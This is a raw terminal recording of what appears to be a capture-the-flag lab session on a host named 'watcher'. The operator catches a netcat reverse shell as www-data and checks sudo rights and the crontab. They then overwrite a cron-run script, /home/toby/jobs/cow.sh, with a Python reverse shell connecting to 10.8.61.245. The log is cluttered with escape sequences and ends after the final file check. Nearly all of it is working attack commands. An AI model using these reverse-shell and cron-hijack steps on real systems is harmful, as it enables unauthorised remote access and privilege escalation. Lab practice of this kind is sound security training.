@@ -1,0 +1,162 @@
+Script started on 2025-04-09 12:36:27+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6673
+SOCKET: Shell has connected! PID: 2178
+[K[K[?2004hpython3 -c 'import ptyt[K;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$         [Ksudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for www-data on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on watcher:
+    (toby) NOPASSWD: ALL
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ cat /etc/crontab[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/crontab
+[Kcat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*/1 * * * * mat /home/toby/jobs/cow.sh
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby cat [7m/home/toby/jobs/cow.sh[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7msudo -u toby cat [27m/home/toby/jobs/cow.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby cat /home/toby/jobs/cow.sh
+[Ksudo -u toby cat /home/toby/jobs/cow.sh
+[K#!/bin/bash
+cp /home/mat/cow.jpg /tmp/cow.jpg
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby cat /home/toby/jobs/cow.sh[C[1P /home/toby/jobs/cow.sh[1P /home/toby/jobs/cow.sh[1P /home/toby/jobs/cow.shl /home/toby/jobs/cow.shs /home/toby/jobs/cow.sh[C /home/toby/jobs/cow.sh- /home/toby/jobs/cow.shl /home/toby/jobs/cow.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby ls -l /home/toby/jobs/cow.sh
+[Ksudo -u toby ls -l /home/toby/jobs/cow.sh
+[K-rwxr-xr-x 1 toby toby 46 Dec  3  2020 /home/toby/jobs/cow.sh
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby ls -l /home/toby/jobs/cow.sh[1P /home/toby/jobs/cow.sh[1P /home/toby/jobs/cow.sh[1P/home/toby/jobs/cow.sh[1P /home/toby/jobs/cow.sh[1P /home/toby/jobs/cow.she /home/toby/jobs/cow.shc /home/toby/jobs/cow.shh /home/toby/jobs/cow.sho /home/toby/jobs/cow.sh[C /home/toby/jobs/cow.sh' /home/toby/jobs/cow.sh' /home/toby/jobs/cow.sh[C /home/toby/jobs/cow.sh> /home/toby/jobs/cow.sh[11@[7m#!/bin/bash[27m[7msudo -u toby echo '[27m#!/bin/bash[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby echo '#!/bin/bash' > /home/toby/jobs/cow.sh
+[K<-u toby echo '#!/bin/bash' > /home/toby/jobs/cow.sh
+[Kbash: /home/toby/jobs/cow.sh: Permission denied
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby echo '#!/bin/bash' > /home/toby/jobs/cow.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cby/jobs/cow.sh[K[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[K[K[K[K[K[K[K[K[K[K[K[K[7mecho '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[27m [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[K<sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[Kwww-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ echo '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[16Psudo -u toby echo '#!/bin/bash' > /home/toby/jobs/cow.sh
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[15Pls -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[2Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby cat /home/toby/jobs/cow.sh
+[Ksudo -u toby cat /home/toby/jobs/cow.sh
+[K#!/bin/bash
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby cat /home/toby/jobs/cow.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[16Psudo -u toby echo '#!/bin/bash' > /home/toby/jobs/cow.sh
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[7mpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_[27m[7mI[27m[7mNET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os[27m[7m.[27m[7mdup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'[27m' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[Apython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'[C[C[C | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/[1Pnull[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C" | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[A[C[C[C[C[C[Cpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/[1Pnull[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/[1Pnull[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'" | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+
+[C[C[C[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/[1Pnull[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C` | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K
+[K[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'` | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[K<sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[Kwww-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ echo `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'` | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[33Psudo -u toby cat /home/toby/jobs/cow.sh
+[K
+[K
+[K[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby cat /home/toby/jobs/cow.sh
+[Ksudo -u toby cat /home/toby/jobs/cow.sh
+[K
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby cat /home/toby/jobs/cow.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'` | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[33Psudo -u toby cat /home/toby/jobs/cow.sh
+[K
+[K
+[K[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho '#!/bin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[K<sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[Kwww-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ [7mecho '#!/usr/bin/python3[27m
+[7mimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",[27m[7m6[27m[7m047));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bas[27m[7mh[27m[7m")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [27m
+[A[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K
+[K
+[K[A[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho '#!/usr/bin/python3
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+
+[Kecho '#!/usr/bin/python3
+> [K> [K> <sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[Kwww-data@watcher:/var/www/html$ 
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[48Pecho '#!/usr/bin/python3
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cbin/bash' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[33Psudo -u toby cat /home/toby/jobs/cow.sh
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby cat /home/toby/jobs/cow.sh
+[Ksudo -u toby cat /home/toby/jobs/cow.sh
+[K#!/usr/bin/python3
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [Kchmod +[?2004hwww-data@watcher:/var/www/html$ [7msudo -u toby chmod +x /home/toby/jobs/cow.sh[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby chmod +x /home/toby/jobs/cow.sh
+[Ksudo -u toby chmod +x /home/toby/jobs/cow.sh
+[Kwww-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ [7mecho '#!/usr/bin/python3[27m
+[7mimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",[27m[7m6[27m[7m047));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bas[27m[7mh[27m[7m")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null [27m
+[A[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho '#!/usr/bin/python3
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash"[1P[A[C[C));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")[1P[A[C));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'[1P[A));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' [1P[A4));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'[1@ [A4));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")[1@'[A4));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash"[1@)[A[C4));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash[1@"[A[C[C[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K
+[K
+[K[A[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho '#!/usr/bin/python3
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+
+[Kecho '#!/usr/bin/python3
+> [K> [K> <sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null
+[Kwww-data@watcher:/var/www/html$ 
+www-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[48Pecho '#!/usr/bin/python3
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo -u toby chmod +x /home/toby/jobs/cow.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby chmod +x /home/toby/jobs/cow.sh
+[Ksudo -u toby chmod +x /home/toby/jobs/cow.sh
+[Kwww-data@watcher:/var/www/html$ [Kwww-data@watcher:/var/www/html$ [K[?2004hwww-data@watcher:/var/www/html$ sudo -u toby chmod +x /home/toby/jobs/cow.sh[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' | sudo -u toby tee /home/toby/jobs/cow.sh > /dev/null[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[48Pecho '#!/usr/bin/python3
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Csudo -u toby chmod +x /home/toby/jobs/cow.sh[5Pat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u toby cat /home/toby/jobs/cow.sh
+[Ksudo -u toby cat /home/toby/jobs/cow.sh
+[K#!/usr/bin/python3
